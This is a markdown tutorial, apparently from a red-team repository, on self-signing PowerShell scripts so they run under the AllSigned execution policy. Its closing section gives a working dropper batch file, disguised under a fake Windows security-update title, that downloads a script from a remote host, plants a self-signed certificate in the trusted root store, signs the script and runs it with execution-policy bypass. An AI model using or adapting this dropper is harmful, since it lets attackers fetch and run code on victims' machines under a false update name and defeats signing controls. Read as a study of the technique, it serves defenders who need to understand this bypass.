### Create a Self-Signed Certificate for Code Signing

<br />

In PoweShell 3.0, the [New-SelfSifgnedCertificate](https://docs.microsoft.com/en-us/powershell/module/pkiclient/new-selfsignedcertificate?view=win10-ps) cmdlet was generating only SSL certificates that couldn’t be used to sign the driver and application code (unlike certificates generated by the MakeCert utility). In PowerShell 5 the new version of the New-SelfSifgnedCertificate
cmdlet can now be used to issue a Code Signing certificates.

<br />

#### Lets build our test script { my_posh_script.ps1 } - Open Notepad Copy/Paste/Save it
```
# Malicious Code to execute
write-host "Just to test IF certificate sign was worked.." -ForeGroundColor green -BackGroundColor black
Start-Sleep -Seconds 3

```
<br />

#### Lets set 'Target' PS Execution Policy to 'AllSigned' to test the script (no need admin rigths)
`Set-ExecutionPolicy AllSigned -Scope CurrentUser`

<br />

#### Lets Run our Script (With PS ExecutionPolicy set to 'AllSigned')
[AllSigned = Requires that all scripts and files are signed by a trusted publisher, including scripts written on local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)

<br />


#### To create a self-signed certificate for signing the application code (my_posh_script.ps1), run the command:
```
$cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My
```

<br />

#### Let’s try to sign our PowerShell script (my_posh_script.ps1) using this certificate:
```
Set-AuthenticodeSignature -FilePath $env:userprofile\Desktop\my_posh_script.ps1 -Certificate $cert
```
![fdr](https://user-images.githubusercontent.com/23490060/72689232-3cdabf00-3b07-11ea-9ba7-ff830fca7356.png)

**Remark:** f you are receiving an **'UnknownError'** warning when executing the command, this means that **'the certificate is not trusted'**.
Because it is located in the **'user’s personal certificates store'** To open the certificate store press: Windows+R -> `certlm.msc`.

<br />

#### We need to move our certificate to the 'trusted root certificates' store
![sd4](https://user-images.githubusercontent.com/23490060/72686277-dba4f280-3aea-11ea-9332-9e8c274bb9fe.png)
![sd5](https://user-images.githubusercontent.com/23490060/72686281-e52e5a80-3aea-11ea-96a6-a11bf6e8e8f3.png)
![sd6](https://user-images.githubusercontent.com/23490060/72686284-ec556880-3aea-11ea-9af0-3e43c4ea8fa1.png)

<br />

#### After that, you can sign your PowerShell script with this self-signed certificate.
```
Set-AuthenticodeSignature -FilePath $env:userprofile\Desktop\my_posh_script.ps1 -Certificate $cert
```

#### After the script beeing signed, it will be append one certificate {code block} inside the PS script:
![po1](https://user-images.githubusercontent.com/23490060/72687557-d2ba1e00-3af6-11ea-840b-702ccbe4bc73.png)
#### Running the script with PS Execution-Policy set to 'AllSigned'
[AllSigned. Requires that all scripts and files are signed by a trusted publisher, including scripts written on local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)
![sdff](https://user-images.githubusercontent.com/23490060/72687601-6a1f7100-3af7-11ea-8f95-9d611d8867b2.png)

<br />

**Remark:** After beeing signed, the PS script can not be changed under the risk of breaking cert code block

**Remark:** Remmenber that this certificate its only valid for the Local Machine (current PC) were it was been stored..
That meens if we port the PS script to a remote machine it will not execute, because remote machine does not contain
this certificate in there certificate store ...

<br />

#### Revert Target System to 'Default' Settings. (non admin privs requiered)
`cmd /c echo Y | powershell Set-ExecutionPolicy Restricted -Scope CurrentUser`
![fin](https://user-images.githubusercontent.com/23490060/72699309-ae366400-3b3f-11ea-9397-fc9c2510f907.png)

<br />

This next step shows us how this technic can be abused (PS Execution Policy bypass) to remote Download/Execute our PS Script, even if target system is config to Only run digitally Signed PS scripts .. It will download and execute him ..

<br />

#### Batch (dropper.bat) Automation Example:
```
@echo off
title Cumulative Security Update KB4524147

:: Code to Download our PS script to 'tmp' remote folder
powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_posh_script.ps1', '$env:tmp\my_posh_script.ps1')
timeout /T 2 >nul

:: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1) { This certificate expires in six months }
powershell $cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -FriendlyName "SsaRedTeam" -NotAfter (Get-Date).AddMonths(6) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\CurrentUser\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
timeout /T 2 >nul

:: Code to Execute our Downloaded script
powershell -Execution Bypass -NoProfile -File "$env:tmp\my_posh_script.ps1"
```
**Remark:** This Dropper.bat can Download-PS-Script/Build-Cert/Sign-PS-Script/Execute-PS-Script because the Policy
its set by Default to powershell Scripts Only (this policy does not affects batch scripts from running and executing all of this)..
